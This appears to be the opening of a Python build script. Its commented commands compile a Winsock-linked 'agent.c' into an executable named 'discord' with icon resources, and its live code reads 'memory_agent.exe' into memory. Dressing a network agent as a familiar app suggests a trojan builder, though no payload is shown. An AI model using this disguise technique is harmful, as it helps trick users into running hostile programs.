# from distutils.ccompiler import new_compiler
# compiler = new_compiler()

# compiler.link_executable(['agent.c'],'agent.exe',libraries=['Ws2_32'])
# windres icon.rc -O coff -o my.res
# gcc agent.c -o discord -lws2_32 back.res icon.res
from os import system

agent = open('memory_agent.exe','rb').read()

